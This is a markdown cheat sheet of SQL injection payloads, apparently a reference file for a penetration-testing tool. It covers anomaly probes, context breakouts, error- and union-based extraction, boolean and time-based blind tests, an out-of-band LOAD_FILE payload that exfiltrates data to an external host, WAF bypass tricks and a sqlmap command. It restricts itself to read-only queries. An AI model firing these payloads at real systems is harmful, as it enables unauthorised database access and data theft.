# SQLi payloads by context + DBMS (shared by sqli-inband / sqli-blind)
# SELECT-safe only. No stacked/destructive queries. Confirm injection before extracting; extract read-only.

## Anomaly probes (detection — feeder)
```
'    "    )    '))    `       -> error / differential = candidate
1-0            (numeric context: if result == value for 1, injectable)
' AND '1'='1   vs   ' AND '1'='2         (string context boolean differential)
 AND 1=1       vs    AND 1=2             (numeric context)
```

## Query-context breakout
| context | break out with |
|---|---|
| string `'...'` | `'` then payload then `-- -` or `'||'` |
| numeric | no quote; ` AND `, arithmetic |
| identifier / ORDER BY | `1,(SELECT ...)` / `1 ASC--` ; column-count via `ORDER BY N` |
| LIKE | `%` and `'` |
| JSON | break the JSON string then the SQL string |

## In-band
```
# error-based (leak via error message)
' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -        (MySQL)
' AND 1=cast((SELECT version()) as int)-- -                      (Postgres)
' AND 1=convert(int,(SELECT @@version))-- -                      (MSSQL)
# union-based (match column count + types)
' ORDER BY 5-- -                 (find column count)
' UNION SELECT NULL,NULL,version(),NULL,NULL-- -
```

## Blind
```
# boolean
' AND (SELECT substring(version(),1,1))='8'-- -
# time
' AND SLEEP(5)-- -                           (MySQL)
'; SELECT pg_sleep(5)-- -                     (Postgres — note: stacked; use only if safe + approved)
' AND 1=(SELECT 1 FROM (SELECT SLEEP(5))x)-- -
IF(1=1,SLEEP(5),0)                            (conditional time)
# OOB (where supported)
' AND LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.OOB\\x'))-- -   (MySQL/Windows)
UTL_HTTP / DBMS_LDAP (Oracle) ; xp_dirtree (MSSQL)
```

## WAF bypass (minimal, escalate only if blocked)
```
/**/  inline comments, case toggling, URL/double-URL encoding, UNION/**/SELECT,
whitespace alt (%09,%0a), concat via 0x hex, scientific notation for numbers
```

## Tooling
`sqlmap -r req.txt --batch --level=N --risk=1 --technique=BEUST --dbms=<DBMS>` — use `--risk=1` (no
destructive), confirm findings MANUALLY, and do not dump real PII.
